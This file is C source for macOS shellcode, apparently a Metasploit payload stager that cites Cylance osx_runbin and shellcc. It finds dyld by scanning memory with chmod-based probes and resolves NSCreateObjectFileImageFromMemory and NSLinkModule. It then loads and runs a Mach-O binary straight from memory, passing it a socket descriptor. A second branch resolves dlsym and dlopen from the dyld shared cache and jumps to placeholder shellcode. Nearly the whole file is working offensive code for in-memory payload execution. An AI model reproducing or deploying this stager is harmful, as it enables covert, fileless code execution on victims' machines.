/*
 * References:
 * @parchedmind
 * https://github.com/CylanceVulnResearch/osx_runbin/blob/master/run_bin.c
 *
 * @nologic
 * https://github.com/nologic/shellcc
 */

#include <stdio.h>
#include <string.h>

#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <mach-o/dyld.h>

#include <dlfcn.h>
#include <asl.h>

#include <sys/types.h>
#include <sys/sysctl.h>

#define DYLD_BASE_ADDR 0x00007fff5fc00000
uint64_t find_macho(uint64_t addr, unsigned int increment, unsigned int pointer);
uint64_t find_symbol(uint64_t base, char* symbol);
int string_compare(const char* s1, const char* s2);

#ifdef OSX
typedef NSObjectFileImageReturnCode (*NSCreateObjectFileImageFromMemory_ptr)(void *address, unsigned long size, NSObjectFileImage *objectFileImage);
typedef NSModule (*NSLinkModule_ptr)(NSObjectFileImage objectFileImage, const char* moduleName, unsigned long options);

uint64_t find_entry_offset(struct mach_header_64 *mh);
int detect_sierra();

#define DEBUG
#ifdef DEBUG
static void print(char * str);
#endif


int main(int argc, char** argv)
{
#ifdef DEBUG
  print("main!\n");
#endif
  uint64_t buffer = 0;
  uint64_t buffer_size = 0;
  __asm__(
      "movq %%r10, %0;\n"
      "movq %%r12, %1;\n"
      : "=g"(buffer), "=g"(buffer_size));

#ifdef DEBUG
  print("hello world!\n");
#endif

  int sierra = detect_sierra();
  uint64_t binary = DYLD_BASE_ADDR;
  if (sierra) {
    binary = find_macho(0x100000000, 0x1000, 0);
    if (!binary) {
      return 1;
    }
    binary += 0x1000;
  }
  uint64_t dyld = find_macho(binary, 0x1000, 0);
  if (!dyld) {
    return 1;
  }

  NSCreateObjectFileImageFromMemory_ptr NSCreateObjectFileImageFromMemory_func = (void*)find_symbol(dyld, "_NSCreateObjectFileImageFromMemory");
  if (!NSCreateObjectFileImageFromMemory_func) {
    return 1;
  } 
#ifdef DEBUG
  print("good symbol!\n");
#endif

  NSLinkModule_ptr NSLinkModule_func = (void*)find_symbol(dyld, "_NSLinkModule");
  if (!NSLinkModule_func) {
    return 1;
  } 

  if (!sierra) {
    NSCreateObjectFileImageFromMemory_func -= DYLD_BASE_ADDR;
    NSLinkModule_func -= DYLD_BASE_ADDR;
  }

  /*if (*(char*)buffer == 'b') {*/
  /*print("magic b!\n");*/
  /*}*/
  *(char*)buffer = '\xcf';
  ((uint32_t *)buffer)[3] = MH_BUNDLE;

  NSObjectFileImage fi = 0; 
  if (NSCreateObjectFileImageFromMemory_func((void*)buffer, buffer_size, &fi) != 1) {
    return 1;
  }
#ifdef DEBUG
  print("created!\n");
#endif

  NSModule nm = NSLinkModule_func(fi, "", NSLINKMODULE_OPTION_PRIVATE | NSLINKMODULE_OPTION_BINDNOW | NSLINKMODULE_OPTION_RETURN_ON_ERROR);
  if (!nm) {
#ifdef DEBUG
    print("no nm!\n");
#endif
    return 1;
  }
#ifdef DEBUG
  print("good nm!\n");
#endif

  uint64_t execute_base = (uint64_t)nm;
  execute_base = find_macho(execute_base, sizeof(int), 1);

  uint64_t entry_off = find_entry_offset((void*)execute_base);
  if (!entry_off) {
    return 1;
  }
  uint64_t entry = (execute_base + entry_off);
  int(*main_func)(int, char**) = (int(*)(int, char**))entry;
  char* socket = (char*)(size_t)argc;
  char *new_argv[] = { "m", socket, NULL };
  int new_argc = 2;
  return main_func(new_argc, new_argv);
}



uint64_t syscall_chmod(uint64_t path, long mode) 
{
  uint64_t chmod_no = 0x200000f;
  uint64_t ret = 0;
  __asm__(
      "movq %1, %%rax;\n"
      "movq %2, %%rdi;\n"
      "movq %3, %%rsi;\n"
      "syscall;\n"
      "movq %%rax, %0;\n"
      : "=g"(ret)
      : "g"(chmod_no), "S"(path), "g"(mode)
      :);
  return ret;
}

int detect_sierra()
{
  uint64_t sc_sysctl = 0x20000ca;
  int name[] = { CTL_KERN, KERN_OSRELEASE };
  uint64_t nameptr = (uint64_t)&name;
  uint64_t namelen = sizeof(name)/sizeof(name[0]);
  char osrelease[32];
  size_t size = sizeof(osrelease);
  uint64_t valptr = (uint64_t)osrelease;
  uint64_t valsizeptr = (uint64_t)&size;
  uint64_t ret = 0;

  __asm__(
      "mov %1, %%rax;\n"
      "mov %2, %%rdi;\n"
      "mov %3, %%rsi;\n"
      "mov %4, %%rdx;\n"
      "mov %5, %%r10;\n"
      "xor %%r8, %%r8;\n"
      "xor %%r9, %%r9;\n"
      "syscall;\n"
      "mov %%rax, %0;\n"
      : "=g"(ret)
      : "g"(sc_sysctl), "g"(nameptr), "g"(namelen), "g"(valptr), "g"(valsizeptr)
      : );

  // osrelease is 16.x.x on Sierra
  if (ret == 0 && size > 2) {
    if (osrelease[0] == '1' && osrelease[1] < '6') {
      return 0;
    }
    if (osrelease[0] <= '9' && osrelease[1] == '.') {
      return 0;
    }
  }
  return 1;
}

#ifdef DEBUG
int string_len(const char* s1) 
{
  const char* s2 = s1;
  while (*s2 != '\0')
  {
    s2++;
  }
  return (s2 - s1);
}

void print(char * str) 
{
  long write = 0x2000004;
  long stdout = 1;
  unsigned long len = string_len(str);
  unsigned long long addr = (unsigned long long) str;
  unsigned long ret = 0;
  /* ret = write(stdout, str, len); */
  __asm__(
      "movq %1, %%rax;\n"
      "movq %2, %%rdi;\n"
      "movq %3, %%rsi;\n"
      "movq %4, %%rdx;\n"
      "syscall;\n"
      "movq %%rax, %0;\n"
      : "=g"(ret)
      : "g"(write), "g"(stdout), "S"(addr), "g"(len)
      : "rax", "rdi", "rdx" );
}
#endif
#else

struct dyld_cache_header
{
    char        magic[16];        // e.g. "dyld_v0     ppc"
    uint32_t    mappingOffset;    // file offset to first shared_file_mapping
    uint32_t    mappingCount;     // number of shared_file_mapping entries
    uint32_t    imagesOffset;     // file offset to first dyld_cache_image_info
    uint32_t    imagesCount;      // number of dyld_cache_image_info entries
    uint64_t    dyldBaseAddress;  // base address of dyld when cache was built
		uint64_t    codeSignatureOffset;
		uint64_t    codeSignatureSize;
		uint64_t    slideInfoOffset;
		uint64_t    slideInfoSize;
		uint64_t    localSymbolsOffset;
		uint64_t    localSymbolsSize;
		char        uuid[16];
};

struct shared_file_mapping {
    uint64_t       address;
    uint64_t       size;
    uint64_t       file_offset;
    uint32_t       max_prot;
    uint32_t       init_prot;
};

struct dyld_cache_image_info
{
    uint64_t    address;
    uint64_t    modTime;
    uint64_t    inode;
    uint32_t    pathFileOffset;
    uint32_t    pad;
};


long syscall(const long syscall_number, const long arg1, const long arg2, const long arg3, const long arg4, const long arg5, const long arg6);
int main(int argc, char** argv);
void * get_dyld_function(const char* function_symbol);
uint64_t syscall_chmod(uint64_t path, long mode);
uint64_t syscall_shared_region_check_np();

void init()
{
  main(0, 0);

  /*uint64_t binary = DYLD_BASE_ADDR;*/
  /*if (1) {*/
    /*binary = find_macho(0x100000000, 0x1000, 0);*/
    /*if (!binary) {*/
      /*return;*/
    /*}*/
    /*binary += 0x1000;*/
  /*}*/
  /*uint64_t dyld = find_macho(binary, 0x1000, 0);*/
  /*if (!dyld) {*/
    /*return;*/
  /*}*/

  /*uint64_t shared_region_start = 0x180000000;*/
  /*uint64_t binary = find_macho(shared_region_start + 0x1000, 0x1000, 0);*/
  /*uint64_t dyld = find_macho(binary + 0x1000, 0x1000, 0);*/
  uint64_t shared_region_check = syscall_shared_region_check_np();
  /*uint64_t dllookup_func = (uint64_t)get_dlsym_addr();*/
  uint64_t dlsym_addr = (uint64_t)get_dyld_function("_dlsym");
  uint64_t dlopen_addr = (uint64_t)get_dyld_function("_dlopen");
  /*struct dyld_cache_header *header = (void*)shared_region_start;*/
  /*struct shared_file_mapping *sfm = (void*)header + header->mappingOffset;*/
  /*void* vm_slide_offset  = (void*)header - sfm->address;*/
  /*NSLog(@"vm_slide_offset %p\n",  vm_slide_offset);*/

  /*struct dyld_cache_image_info *dcimg = (void*)header + header->imagesOffset;*/
  /*void * libdyld_address;*/
  /*for (size_t i=0; i < header->imagesCount; i++) {*/
    /*char * pathFile = (char *)shared_region_start+dcimg->pathFileOffset;*/
    /*if (strstr(pathFile, "libdyld.dylib") != -0) {*/
      /*libdyld_address = (dcimg->address + vm_slide_offset);*/
      /*break;*/
    /*}*/
    /*dcimg++;*/
  /*}*/

  typedef void* (*dlsym_ptr)(void *handle, const char *symbol);
  typedef void* (*dlopen_ptr)(const char *filename, int flags);
  typedef int (*asl_log_ptr)(aslclient asl, aslmsg msg, int level, const char *format, ...);
  dlsym_ptr dlsym_func = dlsym_addr;
  dlopen_ptr dlopen_func = dlopen_addr;
  void* libsystem = dlopen_func("/usr/lib/libSystem.B.dylib", RTLD_NOW);
  asl_log_ptr asl_log_func = dlsym_func(libsystem, "asl_log");
  asl_log_func(0, 0, ASL_LEVEL_ERR, "hello from metasploit!\n");

  typedef void (*func_ptr)();
  func_ptr func = (func_ptr)0x4545454545;
#ifdef __x86_64
#else
	volatile register uint64_t x0 asm("x0") = 0x45454541;
	volatile register uint64_t x1 asm("x1") = (uint64_t)dlsym_func;
	volatile register uint64_t x2 asm("x2") = (uint64_t)libsystem;
	volatile register uint64_t x3 asm("x3") = (uint64_t)asl_log_func;
	volatile register uint64_t x4 asm("x4") = (uint64_t)0x79;
  asm volatile (
      "mov x0, %0\n\t"
      "mov x1, %1\n\t"
      "mov x2, %2\n\t"
      "mov x3, %3\n\t"
      "mov x4, %4\n\t"
      :
      : "r"(x0), "r"(x1), "r"(x2), "r"(x3), "r"(x4)
      : "x0", "x1", "x2", "x3", "x4");
#endif
  func();
}

int main(int argc, char** argv)
{
  /*syscall(4, 1, (long)"xk\n", 4, 0, 0, 0);*/
  /*syscall(4, 0, (long)"xk\n", 4, 0, 0, 0);*/
  return 0;
}

uint64_t syscall_chmod(uint64_t path, long mode)
{
  return syscall(15, path, mode, 0, 0, 0, 0);
}

uint64_t syscall_shared_region_check_np()
{
  uint64_t address = 0;
  syscall(294, &address, 0, 0, 0, 0, 0);
  return address;
}

long syscall(const long syscall_number, const long arg1, const long arg2, const long arg3, const long arg4, const long arg5, const long arg6){
  long ret;
#ifdef __x86_64
  asm volatile (
      "movq %1, %%rax\n\t"
      "movq %2, %%rdi\n\t"
      "movq %3, %%rsi\n\t"
      "movq %4, %%rdx\n\t"
      "movq %5, %%rcx\n\t"
      "movq %6, %%r8\n\t"
      "movq %7, %%r9\n\t"
      "syscall"
      : "=a"(ret)
      : "g"(syscall_number), "g"(arg1), "g"(arg2), "g"(arg3), "g"(arg4), "g"(arg5), "g"(arg6)    );
#else
  // : ¯\_(ツ)_/¯
	volatile register uint64_t x16 asm("x16") = syscall_number;
	volatile register uint64_t x0 asm("x0") = arg1;
	volatile register uint64_t x1 asm("x1") = arg2;
	volatile register uint64_t x2 asm("x2") = arg3;
	volatile register uint64_t x3 asm("x3") = arg4;
	volatile register uint64_t x4 asm("x4") = arg5;
	volatile register uint64_t x5 asm("x5") = arg6;
	volatile register uint64_t xret asm("x0");
  asm volatile (
      "mov x0, %2\n\t"
      "mov x1, %3\n\t"
      "mov x2, %4\n\t"
      "mov x3, %5\n\t"
      "mov x4, %6\n\t"
      "mov x5, %7\n\t"
      "mov x16, %1\n\t"
      "svc 0x80\n\t"
      "mov %0, x0\n\t"
      : "=r"(xret)
      /*: "r"(syscall_number), "r"(arg1), "r"(arg2), "r"(arg3), "r"(arg4), "r"(arg5), "r"(arg6)*/
      : "r"(x16), "r"(x0), "r"(x1), "r"(x2), "r"(x3), "r"(x4), "r"(x5)
      : "x0", "x1", "x2", "x3", "x4", "x5", "x16");
  ret = xret;
#endif
  return ret;
}
#endif

uint64_t find_macho(uint64_t addr, unsigned int increment, unsigned int pointer) 
{
  while(1) {
    uint64_t ptr = addr;
    if (pointer) {
      ptr = *(uint64_t *)ptr;
    }
    unsigned long ret = syscall_chmod(ptr, 0777);
    if (ret == 0x2 && ((int *)ptr)[0] == MH_MAGIC_64) {
      return ptr;
    }

    addr += increment;
  }
  return 0;
}

uint64_t find_entry_offset(struct mach_header_64 *mh)
{
  struct entry_point_command *entry;
  struct load_command *lc = (struct load_command *)((void*)mh + sizeof(struct mach_header_64));
  for (int i=0; i<mh->ncmds; i++) {
    if (lc->cmd == LC_MAIN) {
      entry = (struct entry_point_command *)lc;
      return entry->entryoff;
    }

    lc = (struct load_command *)((unsigned long)lc + lc->cmdsize);
  }

  return 0;
}

int string_compare(const char* s1, const char* s2) 
{
  while (*s1 != '\0' && *s1 == *s2)
  {
    s1++;
    s2++;
  }
  return (*(unsigned char *) s1) - (*(unsigned char *) s2);
}

void * get_dyld_function(const char* function_symbol) 
{
  uint64_t shared_region_start = syscall_shared_region_check_np();
  //NSLog(@"shared_region_start %p\n", shared_region_start);

  struct dyld_cache_header *header = (void*)shared_region_start;
  struct shared_file_mapping *sfm = (void*)header + header->mappingOffset;
  struct dyld_cache_image_info *dcimg = (void*)header + header->imagesOffset;
  uint64_t libdyld_address;
  for (size_t i=0; i < header->imagesCount; i++) {
    char * pathFile = (char *)shared_region_start+dcimg->pathFileOffset;
    //NSLog(@"pathFile %p %s\n", (void*)dcimg->address, pathFile);
    if (string_compare(pathFile, "/usr/lib/system/libdyld.dylib") == 0) {
      //NSLog(@"dyld_address %p\n",  dcimg->address);
      libdyld_address = dcimg->address;
      break;
    }
    dcimg++;
  }
  void* vm_slide_offset  = (void*)header - sfm->address;
  //NSLog(@"vm_slide_offset %p\n",  vm_slide_offset);
  libdyld_address = (libdyld_address + vm_slide_offset);

  struct mach_header_64 *mh = (struct mach_header_64*)libdyld_address;
  const struct load_command* cmd = (struct load_command*)(((char*)mh)+sizeof(struct mach_header_64));
  struct symtab_command* symtab_cmd = 0;
  struct segment_command_64* linkedit_cmd = 0;
  struct segment_command_64* text_cmd = 0;

  for (uint32_t i = 0; i < mh->ncmds; ++i) {
    //NSLog(@"line %d load %p %p", __LINE__, cmd->cmd, cmd);
    if (cmd->cmd == LC_SEGMENT_64) {
      struct segment_command_64* segment_cmd = (struct segment_command_64*)cmd;
      if (string_compare(segment_cmd->segname, SEG_TEXT) == 0) {
        text_cmd = segment_cmd;
        /*NSLog(@"text_segment :%p %s %p %p %p %p:\n", segment_cmd, segment_cmd->segname, segment_cmd->vmaddr, segment_cmd->fileoff, segment_cmd->nsects, segment_cmd->cmd);*/
      } else if (string_compare(segment_cmd->segname, SEG_LINKEDIT) == 0) {
        linkedit_cmd = segment_cmd;
        /*NSLog(@"linkedit :%p %p vmaddr %p fileoff %p:\n", linkedit_cmd, segment_cmd->segname, linkedit_cmd->vmaddr, linkedit_cmd->fileoff);*/
      }
    }
    if (cmd->cmd == LC_SYMTAB) {
      symtab_cmd = (struct symtab_command*)cmd;
      /*NSLog(@"symtab :%p %d %p %p %p:\n", symtab_cmd, symtab_cmd->nsyms, symtab_cmd->symoff, symtab_cmd->stroff, symtab_cmd->strsize);*/
    }
    cmd = (const struct load_command*)(((char*)cmd)+cmd->cmdsize);
  }

  unsigned int file_slide = ((unsigned long)linkedit_cmd->vmaddr - (unsigned long)text_cmd->vmaddr) - linkedit_cmd->fileoff;
  struct nlist_64 *sym = (struct nlist_64*)((unsigned long)mh + (symtab_cmd->symoff + file_slide));
  char *strings = (char*)((unsigned long)mh + (symtab_cmd->stroff + file_slide));

  for (uint32_t i = 0; i < symtab_cmd->nsyms; ++i) {
    if (sym->n_un.n_strx) {
      char * symbol = strings + sym->n_un.n_strx;
      //NSLog(@"symbol :%s %p:\n", symbol, sym->n_value);
      if (string_compare(symbol, function_symbol) == 0) {
        return sym->n_value + vm_slide_offset;
      }
    }
    sym += 1;
  }
  return 0;
}

uint64_t find_symbol(uint64_t base, char* symbol) 
{
  struct segment_command_64 *sc, *linkedit, *text;
  struct load_command *lc;
  struct symtab_command *symtab;
  struct nlist_64 *nl;

  char *strtab;
  symtab = 0;
  linkedit = 0;
  text = 0;

  lc = (struct load_command *)(base + sizeof(struct mach_header_64));
  for (int i=0; i<((struct mach_header_64 *)base)->ncmds; i++) {
    if (lc->cmd == LC_SYMTAB) {
      symtab = (struct symtab_command *)lc;
    } else if (lc->cmd == LC_SEGMENT_64) {
      sc = (struct segment_command_64 *)lc;
      char * segname = ((struct segment_command_64 *)lc)->segname;
      if (string_compare(segname, "__LINKEDIT") == 0) {
        linkedit = sc;
      } else if (string_compare(segname, "__TEXT") == 0) {
        text = sc;
      }
    }
    lc = (struct load_command *)((unsigned long)lc + lc->cmdsize);
  }

  if (!linkedit || !symtab || !text) {
    return 0;
  }

  unsigned long file_slide = linkedit->vmaddr - text->vmaddr - linkedit->fileoff;
  strtab = (char *)(base + file_slide + symtab->stroff);

  nl = (struct nlist_64 *)(base + file_slide + symtab->symoff);
  for (int i=0; i<symtab->nsyms; i++) {

    char *name = strtab + nl[i].n_un.n_strx;
    /*#ifdef DEBUG*/
    /*print(name);*/
    /*print("\n");*/
    /*#endif*/
    if (string_compare(name, symbol) == 0) {
      if (!nl[i].n_value) {
        continue;
      }
      return base + nl[i].n_value;
    }
  }
  
  return 0;
}

